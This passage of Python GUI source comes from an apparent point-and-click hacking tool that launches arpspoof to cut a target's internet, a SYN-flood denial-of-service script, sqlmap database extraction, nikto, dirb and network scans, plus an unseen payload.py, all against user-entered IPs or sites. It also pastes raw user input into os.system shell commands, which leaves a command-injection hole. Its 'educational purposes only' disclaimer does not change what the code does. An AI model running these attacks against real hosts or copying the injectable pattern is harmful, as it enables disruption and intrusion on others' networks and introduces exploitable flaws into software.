            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the Gateway IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg.setIcon(QMessageBox.Information)
            msg.setText("Attack initiating,please wait...")
            msg.exec_() 
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal --window -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("IP forwarding: 0")
            msg1.exec_() 
    def free_net(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:red;")
        self.plainTextEdit_result.insertPlainText("The target's Internet is unlocked")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
        msg.setIcon(QMessageBox.Information)
        msg.setText("IP Forwarding: 1")
        msg.exec_()
    def netdiscover(self):
        try:
            if(self.lineEdit_router.text()==""):
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter Local Gateway IP address")
                msg5.exec_()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.setStyleSheet("color:white;")
                self.plainTextEdit_result.insertPlainText("Local network scanning,please wait...")
                msg = QMessageBox()
                msg.setWindowTitle("Information")
                msg.setBaseSize(300,300)
                msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg.setText("Local network scanning,please wait...")
                msg.setIcon(QMessageBox.Information)
                msg.exec_()
                os.system("gnome-terminal --window -x netdiscover -r {}/16".format(self.lineEdit_router.text()))
                self.plainTextEdit_result.clear()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_network_scanner(self):
        try:
            if(self.lineEdit_router.text()==""):
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter Local Gateway IP address")
                msg5.exec_()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.setStyleSheet("color:white;")
                self.plainTextEdit_result.insertPlainText("Nmap local network scanning,please wait...")
                msg = QMessageBox()
                msg.setWindowTitle("Information")
                msg.setBaseSize(300,300)
                msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg.setText("Nmap local network scanning,please wait...")
                msg.setIcon(QMessageBox.Information)
                msg.exec_()
                os.system("nmap -sn -n -v --open {}/24 -oN output.txt".format(self.lineEdit_router.text()))
                file=open("output.txt","r+")
                info=file.read()
                file.close()
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText(info)
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setText("Nmap local network scan completed successfully.")
                msg1.setIcon(QMessageBox.Information)
                msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def payload(self):
        try:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Application is starting...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg.setText("Application is started")
            msg.setIcon(QMessageBox.Information)
            msg.exec_()
            os.system("gnome-terminal --window -x python3 payload.py")
            self.plainTextEdit_result.clear()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def macchanger_random(self):
        try:
            if self.combobox.currentText()=="Interface":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Critical)
                msg1.setText("Select Your Interface (eth0 or wlan0)")
                msg1.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Mac Address Changer", "If you confirm, your internet will be cut for a few seconds.Are you sure?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Changing mac address,please wait...")
                    os.system("macchanger -r {} > output.txt".format(self.combobox.currentText()))
                    os.system("ifconfig {} down".format(self.combobox.currentText()))
                    time.sleep(1)
                    os.system("ifconfig {} up".format(self.combobox.currentText()))
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Mac address changed successfully (RANDOM MAC ADDRESS)")
                    msg.exec_()
                    self.plainTextEdit_result.clear()
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("MAC address has not been changed.")
                    msg1.exec_()        
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()   
    def macchanger_original(self):
        try:
            if self.combobox.currentText()=="Interface":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Critical)
                msg1.setText("Select Your Interface (eth0 or wlan0)")
                msg1.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Mac Address Changer", "If you confirm, your internet will be cut for a few seconds.Are you sure?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Changing mac address,please wait...")
                    os.system("macchanger -p {} > output.txt".format(self.combobox.currentText()))
                    os.system("ifconfig {} down".format(self.combobox.currentText()))
                    time.sleep(1)
                    os.system("ifconfig {} up".format(self.combobox.currentText()))
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Mac address changed successfully (Original MAC ADDRESS)")
                    msg.exec_()
                    self.plainTextEdit_result.clear()
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("MAC address has not been changed.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def hand_mac(self):
        try:
            if self.combobox.currentText()=="Interface":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Critical)
                msg1.setText("Select Your Interface (eth0 or wlan0)")
                msg1.exec_()
            elif self.lineEdit_mac.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Critical)
                msg1.setText("Enter the mac address you want to change!!")
                msg1.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Mac Address Changer", "If you confirm, your internet will be cut for a few seconds.Are you sure?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Changing mac address,please wait...")
                    os.system("macchanger -m {} {} > output.txt".format(self.lineEdit_mac.text(),self.combobox.currentText()))
                    os.system("ifconfig {} down".format(self.combobox.currentText()))
                    time.sleep(1)
                    os.system("ifconfig {} up".format(self.combobox.currentText()))
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setText("Mac address changed successfully")
                    msg.exec_()
                    self.plainTextEdit_result.clear()
                    self.lineEdit_mac.clear()
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("MAC address has not been changed.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def firewall_detection(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.setStyleSheet("color:white;")
                self.plainTextEdit_result.insertPlainText("Firewall detection is starting,please wait...")
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Firewall detection is starting,please wait...")
                msg1.exec_()
                os.system("wafw00f {} -o output.txt".format(self.lineEdit_site.text().lower()))
                with open("output.txt","r+") as file:
                    info=file.read()
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)
                self.plainTextEdit_result.insertPlainText(info)
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Firewall detection is finished.")
                msg2.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def dos_attack(self):
        try:
            if self.lineEdit_site.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Warning)
                msg1.setText("Please enter the site adress or IP adress!")
                msg1.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Dos Attack", "Doing this attack will make your internet very slow. Are you sure you want to do the attack?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText("Dos Attack is starting,please wait...")
                    os.system("gnome-terminal --window -x python3 dos.py -s {} -p 80 -t 135".format(self.lineEdit_site.text().lower()))
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Dos attack is starting...")
                    msg.exec_()
                    self.plainTextEdit_result.clear()
                    for i in range(500):
                        self.plainTextEdit_result.setStyleSheet("color:red;")
                        self.plainTextEdit_result.appendPlainText(f"{i}:Denial of service attack, SYN packet send.") 
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Dos attack not started!")
                    msg1.exec_()      
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def subdomain(self):
        try:
            if self.lineEdit_site.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Warning)
                msg1.setText("Please enter the site adress or IP adress!")
                msg1.exec_()
            elif self.lineEdit_site.text().startswith("https://www"):
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
                os.system("gnome-terminal --window -x dnsmap {} -r output.txt".format(self.lineEdit_site.text().lower()[12:]))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Searching subdomains,please wait...")
                msg2.exec_()
            elif self.lineEdit_site.text().startswith("http://www"):
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
                os.system("gnome-terminal --window -x dnsmap {} -r output.txt".format(self.lineEdit_site.text().lower()[11:]))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Searching subdomains,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
            elif self.lineEdit_site.text().startswith("www"):
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
                os.system("gnome-terminal --window -x dnsmap {} -r output.txt".format(self.lineEdit_site.text()[4:]))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Searching subdomains,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
                os.system("gnome-terminal --window -x dnsmap {} -r output.txt".format(self.lineEdit_site.text()))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Searching subdomains,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def dmitryscan(self):
        try:
            if self.lineEdit_site.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Warning)
                msg1.setText("Please enter the site adress or IP adress!")
                msg1.exec_()
            elif self.lineEdit_site.text().startswith("https://www"):   
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,ports,mails,please wait...")
                os.system("gnome-terminal --window -x dmitry -winsepfb {}".format(self.lineEdit_site.text().lower()[8:]))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching subdomains,ports,mails,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
            elif self.lineEdit_site.text().startswith("http://www"):   
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,ports,mails,please wait...")
                os.system("gnome-terminal --window -x dmitry -winsepfb {}".format(self.lineEdit_site.text().lower()[7:]))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching subdomains,ports,mails,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()    
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching subdomains,ports,mails,please wait...")
                os.system("gnome-terminal --window -x dmitry -winsepfb {}".format(self.lineEdit_site.text().lower()))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching subdomains,ports,mails,please wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def dirb(self):
        try:
            if self.lineEdit_site.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Warning)
                msg1.setText("Please enter the site adress or IP adress!")
                msg1.exec_()
            elif(self.lineEdit_site.text()[:5]=="http:" or self.lineEdit_site.text()[:6]=="https:"):
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching website folders wait...")
                os.system("gnome-terminal --window -x dirb {}".format(self.lineEdit_site.text().lower()))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching website folders wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching website folders wait...")
                os.system("gnome-terminal --window -x dirb https://{}".format(self.lineEdit_site.text().lower()))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching website folders wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nikto(self):
        try:
            if self.lineEdit_site.text()=="":
                msg1 = QMessageBox()
                msg1.setWindowTitle("Information")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Warning)
                msg1.setText("Please enter the site adress or IP adress!")
                msg1.exec_()
            else:
                self.plainTextEdit_result.clear()
                self.plainTextEdit_result.insertPlainText("Searching website vulnerability wait...")
                os.system("gnome-terminal --window -x nikto -h {} -output output.txt".format(self.lineEdit_site.text().lower()))
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Information)
                msg2.setText("Searching website vulnerability wait...")
                msg2.exec_()
                self.plainTextEdit_result.clear()      
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()        
    def Information(self):
        msg1 = QMessageBox()
        msg1.setWindowTitle("Information")
        msg1.setBaseSize(300,300)
        msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
        msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
        msg1.setIcon(QMessageBox.Information)
        msg1.setText("""
        I am not responsible for your action,This is for educational purposes only.
	        
        It is a graphical interface tool that facilitates the use of many tools such as nmap, nikto,dirb.Update 1.6 is coming soon keep waiting...
        
        More detailed information about the application can be found at this address: https://github.com/Brktrlw/Riglsable

        Distributed under the MIT License. See license for more information.Copyright (c) 2021 BrktrL
        
        You can send me application bugs/error at this address: 'brktrl@protonmail.ch'

        http://www.riglsable.rf.gd/
         """)
        msg1.exec_()
    def get_web_ip(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress!")
                msg5.exec_()
            elif self.lineEdit_site.text().startswith("http://"):
                self.plainTextEdit_result.clear()
                self.url=self.lineEdit_site.text()[7:]
                self.ip_adress=socket.gethostbyname(self.url)
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Information)
                msg5.setText("""
                Website  : {}
                IP Addres: {}""".format(self.url,self.ip_adress))
                msg5.exec_()
                self.plainTextEdit_result.insertPlainText("""Website  : {}\nIP Addres: {}""".format(self.url,self.ip_adress))
            elif self.lineEdit_site.text().startswith("https://"):
                self.plainTextEdit_result.clear()
                self.url=self.lineEdit_site.text()[8:]
                self.ip_adress=socket.gethostbyname(self.url)
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Information)
                msg5.setText("""
                Website  : {}
                IP Addres: {}""".format(self.url,self.ip_adress))
                msg5.exec_()
                self.plainTextEdit_result.insertPlainText("""Website  : {}\nIP Addres: {}""".format(self.url,self.ip_adress))
            else:
                self.plainTextEdit_result.clear()
                self.url=self.lineEdit_site.text()
                self.ip_adress=socket.gethostbyname(self.url)
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Information)
                msg5.setText("""
                Website  : {}
                IP Addres: {}""".format(self.url,self.ip_adress))
                msg5.exec_()
                self.plainTextEdit_result.insertPlainText("""Website  : {}\nIP Addres: {}""".format(self.url,self.ip_adress))
        except:
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please check your the site adress!")
            msg5.exec_() 
    def developer(self):
        msg5 = QMessageBox()
        msg5.setWindowTitle("Information")
        msg5.setBaseSize(300,300)
        msg5.setIcon(QMessageBox.Information)
        msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
        msg5.setText("Software Developer: Berkay Şen \nContact: brktrl@protonmail.ch\nInstagram: @Brktrll.z\n\nGraphics Designer: Ozan Eskiyurt\nContact: ozaneskiyurt1610@gmail.com\nInstagram: @ozanskryt")
        msg5.exec_()
    def sqlmap(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!") 
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Sqlmap", "Do you approve of doing sqlmap?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    os.system("gnome-terminal --window -x sqlmap -u {} --dbs".format(self.lineEdit_site.text()))
                if reply==QMessageBox.No:
                    msg6 = QMessageBox()
                    msg6.setWindowTitle("Warning")
                    msg6.setBaseSize(300,300)
                    msg6.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg6.setIcon(QMessageBox.Critical)
                    msg6.setText("Sqlmap could not be started")
                    msg6.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def whois(self):
        try:
            check=self.lineEdit_site.text().startswith("www.")
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            elif self.lineEdit_site.text().startswith("http://"):
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Whois lookup loading,please wait.")
                msg1.exec_()
                self.url=self.lineEdit_site.text()[7:]
                self.ip_adress=socket.gethostbyname(self.url)
                os.system("whois {} > output.txt".format(self.ip_adress))
                with open("output.txt","r+") as file:
                    info=file.read()
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)
            elif self.lineEdit_site.text().startswith("https://"):
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Whois lookup loading,please wait.")
                msg1.exec_()
                self.url=self.lineEdit_site.text()[8:]
                self.ip_adress=socket.gethostbyname(self.url)
                os.system("whois {}".format(self.ip_adress))
                with open("output.txt","r+") as file:
                    info=file.read()
